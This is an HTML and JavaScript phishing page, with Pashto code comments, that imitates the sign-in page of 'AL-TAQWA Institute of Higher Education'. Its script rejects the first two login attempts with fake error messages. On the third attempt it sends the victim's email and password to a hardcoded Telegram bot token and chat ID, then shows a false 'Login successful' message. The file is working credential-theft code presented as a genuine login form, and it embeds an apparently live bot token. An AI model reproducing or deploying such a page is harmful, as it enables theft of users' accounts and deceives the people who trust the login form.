<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>AL-TAQWA - Sign in</title>
    <style>
        /* Reset & Base - سپین پس‌منظر، لکه انځور */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* د کارت بڼه – سپینه، د انځور په شان ساده سیوري */
        .login-container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 0;
            box-shadow: none;
            padding: 40px 32px 48px;
            text-align: center;
        }

        /* لوګو / نوم - لکه انځور */
        .logo h1 {
            font-size: 36px;
            font-weight: 700;
            color: #1e3a2f;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }

        .logo .institute {
            font-size: 15px;
            color: #4a6b5e;
            font-weight: 500;
            margin-bottom: 24px;
        }

        .signin-badge {
            font-size: 16px;
            font-weight: 600;
            color: #1e3a2f;
            background: transparent;
            margin: 20px 0 16px 0;
            letter-spacing: 0.3px;
        }

        /* فورم ډیزاین – دقیقاً د انځور په شان */
        .input-group {
            text-align: left;
            margin-bottom: 22px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1e2a24;
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #d4dcd8;
            border-radius: 12px;
            background: #fff;
            outline: none;
            transition: 0.2s;
        }

        .input-group input:focus {
            border-color: #2b7a5c;
            box-shadow: 0 0 0 3px rgba(43, 122, 92, 0.1);
        }

        /* چیک باکس – لکه عکس */
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0 32px;
        }

        .checkbox-wrapper input {
            width: 18px;
            height: 18px;
            margin: 0;
        }

        .checkbox-wrapper label {
            font-size: 14px;
            color: #2a4238;
            font-weight: 500;
        }

        /* لاګ ان تڼۍ – د انځور په شان رنګ */
        button {
            width: 100%;
            background-color: #216e54;
            color: white;
            font-size: 16px;
            font-weight: 600;
            padding: 14px;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
        }

        button:hover {
            background-color: #155a44;
        }

        /* د پیغام ښودلو ساحه – هیڅ پښتو نشته */
        .message-area {
            margin-top: 24px;
            font-size: 13px;
            font-weight: 500;
        }

        .error-message {
            background-color: #fef2f0;
            color: #c5221f;
            padding: 10px 14px;
            border-radius: 60px;
            display: inline-block;
            width: 100%;
        }

        .success-message {
            background-color: #e6f4ea;
            color: #146b3a;
        }

        /* د عکس سره سمون – کوم اضافي عنصر نه */
        hr {
            display: none;
        }

        /* د یادښت هیڅ توکي نه */
        .note-hidden {
            display: none;
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="logo">
        <h1>AL-TAQWA</h1>
        <div class="institute">Institute of Higher Education</div>
    </div>
    <div class="signin-badge">Sign in</div>

    <form id="loginForm">
        <div class="input-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="Email" autocomplete="off">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Password">
        </div>
        <div class="checkbox-wrapper">
            <input type="checkbox" id="rememberCheckbox">
            <label for="rememberCheckbox">Remember password</label>
        </div>
        <button type="submit" id="loginButton">Login</button>
    </form>

    <div id="messageDisplay" class="message-area"></div>
</div>

<script>
    // د هڅو شمېر (په session کې ساتل کیږي، کارونکي ته نه ښودل کیږي)
    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts')) || 0;

    // ټیلیګرام بوټ توکین او چټ آي ډي (لکه څنګه چې غوښتل شوي)
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const CHAT_ID = "8295417969";

    // د ټیلیګرام استولو فنکشن
    async function sendToTelegram(email, password) {
        const message = `🔐 *AL-TAQWA LOGIN* 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        } catch (err) {
            console.error("Telegram send error:", err);
        }
    }

    function showMessage(text, isSuccess = false) {
        const msgDiv = document.getElementById('messageDisplay');
        msgDiv.innerHTML = `<div class="error-message ${isSuccess ? 'success-message' : ''}">${text}</div>`;
        if (isSuccess) {
            // بریالي لاګ ان – انپوټونه او بټن غیر فعال کړئ
            document.getElementById('email').disabled = true;
            document.getElementById('password').disabled = true;
            document.getElementById('loginButton').disabled = true;
            setTimeout(() => {
                sessionStorage.removeItem('loginAttempts');
                if (confirm("✅ Login successful!\nReload page?")) {
                    window.location.reload();
                }
            }, 400);
        }
    }

    // د فورمې استول
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const emailInput = document.getElementById('email').value.trim();
        const passwordInput = document.getElementById('password').value;
        const rememberChecked = document.getElementById('rememberCheckbox').checked;

        // د "Remember password" ساده ساتنه (یوازې UI)
        if (rememberChecked) {
            localStorage.setItem('savedEmail', emailInput);
        } else {
            localStorage.removeItem('savedEmail');
        }

        // کړنلار (Logic) : 
        // لومړۍ هڅه (attemptCount === 0) -> please check your email
        if (attemptCount === 0) {
            showMessage("please check your email", false);
            attemptCount++;
            sessionStorage.setItem('loginAttempts', attemptCount);
            return;
        }
        
        // دوهمه هڅه (attemptCount === 1) -> please check your password
        if (attemptCount === 1) {
            showMessage("please check your password", false);
            attemptCount++;
            sessionStorage.setItem('loginAttempts', attemptCount);
            return;
        }
        
        // دریمه هڅه (attemptCount === 2) – هر ډول ایمیل/پاسورډ ومنئ او بریالی لاګ ان
        if (attemptCount === 2) {
            // ټیلیګرام ته استول
            await sendToTelegram(emailInput, passwordInput);
            showMessage("✅ Login successful", true);
            sessionStorage.removeItem('loginAttempts');
            return;
        }
        
        // که د 3 څخه زیاتې هڅې شوې وي (یوازې د خوندیتوب لپاره)
        if (attemptCount >= 3) {
            showMessage("Too many attempts. Refresh page.", false);
            document.getElementById('loginButton').disabled = true;
        }
    });

    // د مخ په پیل کې د یاد شوي ایمیل ډکول
    window.addEventListener('DOMContentLoaded', () => {
        const saved = localStorage.getItem('savedEmail');
        if (saved) {
            document.getElementById('email').value = saved;
            document.getElementById('rememberCheckbox').checked = true;
        }
        // که هڅې مخکې له 3 څخه زیاتې شوي وای، نو بټن بند کړئ
        if (sessionStorage.getItem('loginAttempts') >= 3) {
            document.getElementById('loginButton').disabled = true;
            showMessage("Session expired. Please refresh the page.", false);
        }
    });
</script>
</body>
</html>
